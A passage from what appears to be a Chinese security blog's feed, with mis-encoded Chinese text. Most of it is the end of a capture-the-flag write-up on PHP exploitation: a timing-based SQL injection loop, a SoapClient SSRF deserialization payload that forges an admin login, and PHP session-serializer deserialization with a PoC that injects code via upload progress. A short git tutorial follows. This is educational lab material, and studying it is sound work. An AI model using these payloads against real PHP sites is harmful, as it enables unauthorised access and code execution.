cookies=cookies, timeout=<span class="number">4.5</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ç”±äºadminè®¾ç½®äº†éæœ¬åœ°ipä¸å…è®¸ç™»å½•ï¼Œå…‰æœ‰å¯†ç è¿˜ä¸å¤Ÿï¼Œæˆ‘ä»¬éœ€è¦SSRFç»•è¿‡é™åˆ¶ï¼›å‘ç°sqlæ³¨å…¥åŒæ—¶è¿˜å­˜åœ¨ä¸€å¤„ååºåˆ—åŒ–æ¼æ´ï¼š</p><p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180313112022-7728da44-266d-1.png" alt=""></p><p>ç”Ÿæˆæœ¬åœ°adminç™»å½•æŠ¥æ–‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/index.php?action=login'</span>;</span><br><span class="line">$post_string = <span class="string">'username=admin&amp;password=ç”¨æˆ·å¯†ç &amp;code=ä½ çš„éªŒè¯ç '</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=éœ€è¦æˆä¸ºadminçš„æµè§ˆå™¨çš„cookie'</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;'</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> bin2hex($aaa);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€åæ³¨å…¥ï¼Œåˆ·æ–°æµè§ˆå™¨å³å¯æˆä¸ºadminï¼Œç„¶åå³å¯è¿›å…¥ä¸Šä¼ é¡µé¢ã€‚</p><h2 id="Sessionååºåˆ—åŒ–"><a href="#Sessionååºåˆ—åŒ–" class="headerlink" title="Sessionååºåˆ—åŒ–"></a>Sessionååºåˆ—åŒ–</h2><h3 id="å­˜å‚¨æœºåˆ¶"><a href="#å­˜å‚¨æœºåˆ¶" class="headerlink" title="å­˜å‚¨æœºåˆ¶"></a>å­˜å‚¨æœºåˆ¶</h3><p>PHPä¸­sessioné»˜è®¤æ˜¯ä»¥æ–‡ä»¶å½¢å¼å­˜å‚¨çš„ï¼Œæ–‡ä»¶ä»¥<code>sess_sessionid</code>å‘½åï¼Œå†…å®¹æ ¹æ®åºåˆ—åŒ–çš„å¤„ç†å™¨çš„ä¸åŒï¼Œæœ‰ç›¸åº”çš„å­˜å‚¨æ ¼å¼ï¼Œåºåˆ—åŒ–å¤„ç†å™¨é»˜è®¤ä¸º<code>php</code>ï¼Œå¯ä»¥é€šè¿‡<code>php_serialize_handler</code>è®¾ç½®ã€‚</p><h3 id="å­˜å‚¨æ ¼å¼"><a href="#å­˜å‚¨æ ¼å¼" class="headerlink" title="å­˜å‚¨æ ¼å¼"></a>å­˜å‚¨æ ¼å¼</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phpï¼šé”®å|serialize(é”®å€¼)</span><br><span class="line">php_serializeï¼šserialize(é”®åå’Œé”®å€¼)</span><br><span class="line">php_binaryï¼šé”®åé•¿åº¦å¯¹åº”çš„asciiå­—ç¬¦+é”®å+serialize(é”®å€¼)</span><br></pre></td></tr></table></figure><p>ä»¥ä¸€ä¸ªå°ä¾‹å­éªŒè¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//session_generate.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_binary'</span>);<span class="comment">//é€šè¿‡æ›´æ¢ä¸åŒçš„å¤„ç†å™¨è§‚å¯Ÿsessionå˜åŒ–</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'name'</span>] = <span class="string">'sketch_pl4ne'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>phpï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/10/07/gL5C67.png" alt=""></p><p>php_serializeï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/10/07/gL5cO6.png" alt=""></p><p><strong>PSï¼ša:1:{xxxxxx}æ˜¯é»˜è®¤æ ¼å¼</strong></p><p>php_binaryï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/10/07/gL5mPT.png" alt=""></p><p><strong>PSï¼šchr(4)æ˜¯ä¸å¯è§å­—ç¬¦</strong></p><h3 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//foo1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'sketch_pl4ne'</span>] = $_GET[<span class="string">'a'</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//foo2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sketch_pl4ne</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> $name;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;name = <span class="string">'SP_wants_a_girlfriend.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hi! '</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sketch_pl4ne</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> $name;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;name = <span class="string">'SP_wants_a_girlfriend.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hi! '</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> sketch_pl4ne();</span><br><span class="line">$o-&gt;name = <span class="string">'sketch_pl4ne'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payloadï¼š<code>/foo1.php?a=|O:12:&quot;sketch_pl4ne&quot;:1:{s:4:&quot;name&quot;;s:12:&quot;sketch_pl4ne&quot;;}</code></p><p>è®¿é—®<code>foo2.php</code>ï¼ŒæˆåŠŸè¾“å‡º<code>hi! sketch_pl4ne</code>ã€‚</p><p>æŸ¥çœ‹ç”Ÿæˆçš„sessionæ–‡ä»¶ï¼š</p><p><img src="https://t1.picb.cc/uploads/2019/10/07/gL5GHt.png" alt=""></p><p>å¯ä»¥å‘ç°åªè¦æˆ‘ä»¬åœ¨éœ€è¦ä¼ å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²å‰åŠ <code>|</code>ï¼Œé‚£ä¹ˆèµ°<code>foo2.php</code>çš„<code>php</code>å¤„ç†å™¨æ—¶å‰é¢éƒ½ä¼šè¢«å½“ä½œsession_nameï¼Œåé¢æ„é€ çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è‡ªç„¶å°±è¢«è§£æäº†ã€‚</p><h3 id="php-session-uoload-progress"><a href="#php-session-uoload-progress" class="headerlink" title="php_session_uoload_progress"></a>php_session_uoload_progress</h3><p>å½“æ²¡æœ‰$_SESSION[â€˜sketch_pl4neâ€™] = $_GET[â€˜aâ€™]è¿™ä¹ˆå¥½çš„æ¡ä»¶æ—¶è¯¥æ€ä¹ˆå†™å…¥payloadå‘¢ï¼Ÿæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨phpçš„ä¸Šä¼ è¿›åº¦æŠ¥å‘Šå‘sessionæ–‡ä»¶ä¸­å†™å…¥æ„é€ å¥½çš„payload (doge)</p><p>è¿™é‡Œä»¥jarvisojä¸­çš„PHPINFOä¸ºä¾‹ï¼š<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">PHPINFO</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¯ä¸ªå¾ˆç®€å•çš„ååºåˆ—åŒ–ï¼Œå…³é”®æ˜¯æ‰¾ä¸åˆ°è¾“å…¥ç‚¹ï¼Œè¿™é‡Œéœ€è¦åˆ©ç”¨å¦å¤–ä¸€ç§è§¦å‘sessionååºåˆ—åŒ–çš„æ–¹å¼ï¼š<strong><em>åˆ©ç”¨ä¸Šä¼ è¿›åº¦æŠ¥å‘Šå‘SESSIONæ–‡ä»¶ä¸­å†™å…¥payloadã€‚</em></strong></p><p>æˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸€ä¸ªä¸session.upload_progress.nameåŒåçš„å˜é‡(é»˜è®¤ä¸ºPHP_SESSION_UPLOAD_PROGRESS)ï¼ŒPHPæ£€æµ‹åˆ°è¿™ç§åŒåè¯·æ±‚ä¼šåœ¨<code>$_SESSION</code>ä¸­æ·»åŠ ä¸€æ¡æ•°æ®ã€‚æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶è¿™ä¸ªæ•°æ®å†…å®¹ä¸ºæˆ‘ä»¬çš„æ¶æ„payloadã€‚</p><p>è§¦å‘æ¡ä»¶ï¼š</p><ul><li>session.upload_progress.enabled=On</li><li>session.upload_progress.cleanup=Off</li></ul><p>é€šè¿‡phpinfo()é¡µé¢å¯ä»¥å‘ç°ç¬¦åˆæ¡ä»¶</p><p>é¦–å…ˆæ„é€ ä¸€ä¸ªupload.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;web.jarvisoj.com:32784&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt; </span><br><span class="line">    &lt;!--valueä¸ºpayloadè¾“å…¥ç‚¹--&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>å†æ ¹æ®é¢˜ç›®å†™ä¸€ä¸ªPoC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> OowoO();</span><br><span class="line">$a-&gt;mdzz = <span class="string">"print_r(scandir('.'));"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PSï¼šæ³¨æ„åœ¨ç”Ÿæˆçš„payloadå‰åŠ <code>|</code>ã€‚</p><p>æœ€åflagåœ¨ä¸€ä¸ªå¾ˆè¯¡å¼‚çš„åœ°æ–¹= =</p><p><img src="https://t1.picb.cc/uploads/2019/10/07/gL58CJ.png" alt=" "></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä»Šå¤©å¾—çŸ¥è‹±è¯­ä½œæ–‡è¶…çº§åŠ å€ï¼Œå”‰ï¼Œæˆ‘åæ‰‹ç‚¹ä¸€ä¸ªä¸å†™ï¼Œé—·å£°å‘å¤§è´¢~</p><p>æ˜å¤©sqlæ³¨å…¥æ€»ç»“ï¼Œå†²å†²å†²ï¼</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;åœ¨å…ˆçŸ¥çœ‹åˆ°&lt;strong&gt;Threezh1&lt;/strong&gt;å¸ˆå‚…çš„&lt;a href=&quot;https://xz.aliyun.com/t/6454
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>gitå­¦ä¹ </title>
    <link href="https://www.sketchplane.top/2019/09/28/git%E5%AD%A6%E4%B9%A0/"/>
    <id>https://www.sketchplane.top/2019/09/28/git%E5%AD%A6%E4%B9%A0/</id>
    <published>2019-09-28T01:17:31.000Z</published>
    <updated>2019-09-28T02:33:50.195Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>Gitæ˜¯ä¸€ä¸ªä¼˜ç§€çš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œä½¿ç”¨èµ·æ¥ç¡®å®æ¯”è¾ƒæ–¹ä¾¿ã€‚</p><p>è¶ç€å‘¨æœ«èŠ±äº†ä¸¤ä¸ªå°æ—¶å­¦ä¹ äº†ä¸€ä¸‹åŸºç¡€å‘½ä»¤ï¼Œä»¥ç›®å‰æˆ‘çš„ç†è§£æ¥è¯´ï¼Œå®ƒä¸»è¦æ˜¯æ–¹ä¾¿æˆ‘ä»¬ä¿å­˜è¿›åº¦ï¼Œç±»ä¼¼äºå­˜æ¡£æœºåˆ¶ï¼Œç†è§£æœ‰è¯¯ä¸æ¥å—åé©³ï¼ˆå“¼ ã€‚</p><h2 id="æœ¬åœ°ä»“åº“"><a href="#æœ¬åœ°ä»“åº“" class="headerlink" title="æœ¬åœ°ä»“åº“"></a>æœ¬åœ°ä»“åº“</h2><h3 id="åˆå§‹åŒ–ä»“åº“"><a href="#åˆå§‹åŒ–ä»“åº“" class="headerlink" title="åˆå§‹åŒ–ä»“åº“"></a>åˆå§‹åŒ–ä»“åº“</h3><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥åœ¨æœ¬åœ°æ–°å»ºä¸€ä¸ªç›®å½•ï¼Œç„¶åè¿è¡Œåˆå§‹åŒ–å‘½ä»¤è®©å®ƒæˆä¸ºä¸€ä¸ª<code>repository</code>ï¼Œå› ä¸ºè¿™æ ·æˆ‘ä»¬æ‰èƒ½ä½¿ç”¨gitå‘½ä»¤è¿›è¡Œæ·»åŠ å’Œæäº¤ç­‰æ“ä½œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git init</span></span><br></pre></td></tr></table></figure><h3 id="æ·»åŠ æ–‡ä»¶"><a href="#æ·»åŠ æ–‡ä»¶" class="headerlink" title="æ·»åŠ æ–‡ä»¶"></a>æ·»åŠ æ–‡ä»¶</h3><p>æˆ‘ä»¬é€šå¸¸å…ˆå°†ç¼–å†™å¥½çš„ä»£ç æ–‡ä»¶å‚¨å­˜åœ¨åˆ°æœ¬åœ°ä»“åº“ï¼Œæœ€åpushåˆ°è¿œç¨‹ä»“åº“ä¸­(github)ï¼Œåœ¨æœ¬åœ°æ·»åŠ æ–‡ä»¶åˆ°ä»“åº“éœ€è¦ä¸¤ä¸ªæ­¥éª¤ï¼š<code>æ·»åŠ </code>å’Œ<code>æäº¤</code>ã€‚</p><p>æ·»åŠ ç±»ä¼¼äºå…ˆæŠŠæ–‡ä»¶æ”¾åœ¨ç¼“å†²åŒºä¸­ï¼Œ<strong>å¯ä»¥è¿ç»­æ·»åŠ å¤šä¸ªæ–‡ä»¶ï¼Œæœ€åä¸€å¹¶æäº¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git add &lt;file_1&gt; &lt;file_2&gt; ... &lt;file_n&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åæäº¤ï¼Œè¿™é‡Œçš„ -m å‚æ•°æ˜¯å†™ä¸€æ®µæè¿°ä¿¡æ¯ï¼Œæ–¹ä¾¿ä»¥åæŸ¥é˜…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git commit &lt;file&gt; -m <span class="string">"your description"</span></span></span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å°±æŠŠæ–‡ä»¶æ·»åŠ åˆ°æœ¬åœ°ä»“åº“äº†~</p><h3 id="æ¨é€è‡³è¿œç¨‹ä»“åº“"><a href="#æ¨é€è‡³è¿œç¨‹ä»“åº“" class="headerlink" title="æ¨é€è‡³è¿œç¨‹ä»“åº“"></a>æ¨é€è‡³è¿œç¨‹ä»“åº“</h3><p>æ¥ä¸‹æ¥æŠŠæœ¬åœ°ä»“åº“pushåˆ°ä»£ç æ‰˜ç®¡å¹³å°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git remote add origin git@github.com:sketchpl4ne/learngit.git</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git push -u origin master</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å°±æŠŠæœ¬åœ°ä»“åº“çš„å†…å®¹æ¨é€åˆ°<code>github</code>ä¸Šäº†~</p><h2 id="è¿œç¨‹ä»“åº“"><a href="#è¿œç¨‹ä»“åº“" class="headerlink" title="è¿œç¨‹ä»“åº“"></a>è¿œç¨‹ä»“åº“</h2><p>æˆ‘ä»¬ä½¿ç”¨å¾—æœ€å¤šçš„åº”è¯¥å°±æ˜¯æŠŠgithubä¸Šçš„é¡¹ç›®å…‹éš†åˆ°æœ¬åœ°ï¼Œæ¯”å¦‚å°†æˆ‘æœ€è¿‘forkçš„ä¸€ä¸ª<code>ç¨‹åºçŒ¿å…»æˆè®¡åˆ’</code>çš„é¡¹ç›®cloneåˆ°æœ¬åœ°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> git@github.com:sketchpl4ne/growing-up.git</span></span><br></pre></td></tr></table></figure><p><img src="https://t1.picb.cc/uploads/2019/09/28/gT6HJD.png" alt=""></p><p>å½“ç„¶è¿™é‡Œä¹Ÿæ”¯æŒhttp://åè®®ï¼Œä¸è¿‡é»˜è®¤çš„git://ä½¿ç”¨sshé€Ÿåº¦åº”è¯¥æ˜¯æ›´å¿«çš„ã€‚</p><h2 id="å…¶ä»–å‘½ä»¤"><a href="#å…¶ä»–å‘½ä»¤" class="headerlink" title="å…¶ä»–å‘½ä»¤"></a>å…¶ä»–å‘½ä»¤</h2><h3 id="å†å²è®°å½•"><a href="#å†å²è®°å½•" class="headerlink" title="å†å²è®°å½•"></a>å†å²è®°å½•</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br></pre></td></tr></table></figure><h3 id="å½“å‰çŠ¶æ€"><a href="#å½“å‰çŠ¶æ€" class="headerlink" title="å½“å‰çŠ¶æ€"></a>å½“å‰çŠ¶æ€</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br></pre></td></tr></table></figure><h3 id="ç‰ˆæœ¬å›é€€"><a href="#ç‰ˆæœ¬å›é€€" class="headerlink" title="ç‰ˆæœ¬å›é€€"></a>ç‰ˆæœ¬å›é€€</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard HEAD^^^ //å›é€€åˆ°ä¸Šä¸‰ä¸ªç‰ˆæœ¬</span></span><br></pre></td></tr></table></figure><p>ç”±äºcmdä¸‹ <code>^</code>é»˜è®¤æ¢è¡Œç¬¦ï¼Œéœ€è¦ç”¨åŒå¼•å·åŒ…è£¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard <span class="string">"HEAD^^^"</span><span class="string">" //å›é€€åˆ°ä¸Šä¸‰ä¸ªç‰ˆæœ¬ï¼Œcmdç‰ˆ</span></span></span><br></pre></td></tr></table></figure><h3 id="åˆ é™¤æ–‡ä»¶ä¸æ’¤é”€åˆ é™¤"><a href="#åˆ é™¤æ–‡ä»¶ä¸æ’¤é”€åˆ é™¤" class="headerlink" title="åˆ é™¤æ–‡ä»¶ä¸æ’¤é”€åˆ é™¤"></a>åˆ é™¤æ–‡ä»¶ä¸æ’¤é”€åˆ é™¤</h3><p>å¦‚æœåœ¨å½“å‰ç›®å½•åˆ é™¤äº†æ–‡ä»¶ï¼Œéœ€è¦åœ¨gitä¸‹åŒæ­¥åˆ é™¤ï¼Œä½¿ç”¨ <code>git status</code>ä¼šæœ‰æç¤ºï¼Œå¦‚æœçœŸçš„è¦åˆ é™¤çš„è¯ï¼Œä¸æ·»åŠ æ–‡ä»¶ç±»ä¼¼ï¼Œå…ˆåˆ é™¤ï¼Œå†æäº¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git rm whz_tianxiadiyi.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"remove 